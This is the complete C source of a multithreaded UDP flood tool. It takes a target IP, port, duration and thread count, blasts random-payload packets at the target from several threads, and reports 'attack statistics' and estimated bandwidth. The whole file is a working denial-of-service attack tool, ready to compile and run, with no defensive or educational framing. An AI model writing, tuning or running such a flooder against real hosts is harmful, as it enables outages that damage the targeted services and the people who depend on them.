#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/time.h>

#define MAX_PACKET_SIZE 1400
#define MIN_PACKET_SIZE 500
#define THREADS_PER_CORE 2

volatile sig_atomic_t stop = 0;
unsigned long total_packets = 0;
pthread_mutex_t counter_lock;

struct thread_data {
    char ip[16];
    int port;
    int time;
    int thread_id;
    unsigned long packets_sent;
};

void handle_sigint(int sig) {
    printf("\nInterrupt received. Stopping attack...\n");
    stop = 1;
}

void usage() {
    printf("Usage: ./udp_flood ip port time threads\n");
    printf("Example: ./udp_flood 1.2.3.4 80 60 8\n");
    exit(1);
}

void generate_payload(char *buffer, int size) {
    // Generate random payload more efficiently
    for (int i = 0; i < size; i++) {
        buffer[i] = (char)(rand() % 256);
    }
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    struct timeval start, end;
    char payload[MAX_PACKET_SIZE];

    // Socket creation with optimizations
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Socket optimizations
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &(int){1024*1024}, sizeof(int));

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    inet_pton(AF_INET, data->ip, &server_addr.sin_addr);

    gettimeofday(&start, NULL);
    end.tv_sec = start.tv_sec + data->time;
    end.tv_usec = start.tv_usec;

    while (!stop) {
        struct timeval now;
        gettimeofday(&now, NULL);
        if (now.tv_sec > end.tv_sec || 
            (now.tv_sec == end.tv_sec && now.tv_usec >= end.tv_usec)) {
            break;
        }

        // Random packet size between MIN_PACKET_SIZE and MAX_PACKET_SIZE
        int pkt_size = MIN_PACKET_SIZE + (rand() % (MAX_PACKET_SIZE - MIN_PACKET_SIZE));
        generate_payload(payload, pkt_size);

        // Send without checking return value for maximum speed
        sendto(sock, payload, pkt_size, 0, 
              (const struct sockaddr *)&server_addr, sizeof(server_addr));

        data->packets_sent++;
        
        // Update global counter periodically
        if (data->packets_sent % 100 == 0) {
            pthread_mutex_lock(&counter_lock);
            total_packets += 100;
            pthread_mutex_unlock(&counter_lock);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

void print_stats(struct thread_data *threads, int thread_count, int duration) {
    unsigned long total = 0;
    printf("\n=== Attack Statistics ===\n");
    for (int i = 0; i < thread_count; i++) {
        printf("Thread %d: %lu packets\n", threads[i].thread_id, threads[i].packets_sent);
        total += threads[i].packets_sent;
    }
    printf("\nTotal Packets: %lu\n", total);
    printf("Packets/sec: %.2f\n", (float)total/duration);
    printf("Estimated Bandwidth: %.2f Mbps\n\n", 
          ((float)total*(MIN_PACKET_SIZE+MAX_PACKET_SIZE)/2*8)/(duration*1024*1024));
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    signal(SIGINT, handle_sigint);
    pthread_mutex_init(&counter_lock, NULL);

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int requested_threads = atoi(argv[4]);

    // Calculate optimal thread count
    int cores = sysconf(_SC_NPROCESSORS_ONLN);
    int optimal_threads = cores * THREADS_PER_CORE;
    int threads = (requested_threads > optimal_threads) ? optimal_threads : requested_threads;

    if (requested_threads > optimal_threads) {
        printf("Warning: Reducing threads from %d to %d (optimal for %d cores)\n",
              requested_threads, optimal_threads, cores);
    }

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data *threads_data = malloc(threads * sizeof(struct thread_data));

    printf("Starting UDP flood on %s:%d for %d seconds with %d threads\n", 
          ip, port, duration, threads);

    // Launch threads
    for (int i = 0; i < threads; i++) {
        strncpy(threads_data[i].ip, ip, 16);
        threads_data[i].port = port;
        threads_data[i].time = duration;
        threads_data[i].thread_id = i;
        threads_data[i].packets_sent = 0;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&threads_data[i]) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            free(threads_data);
            exit(1);
        }
    }

    // Progress monitoring
    time_t start_time = time(NULL);
    while (!stop && time(NULL) < start_time + duration) {
        sleep(1);
        pthread_mutex_lock(&counter_lock);
        printf("\rPackets sent: %lu (%.2f pps)", 
              total_packets, (float)total_packets/(time(NULL)-start_time));
        fflush(stdout);
        pthread_mutex_unlock(&counter_lock);
    }

    // Cleanup
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    print_stats(threads_data, threads, duration);

    free(thread_ids);
    free(threads_data);
    pthread_mutex_destroy(&counter_lock);
    return 0;
}
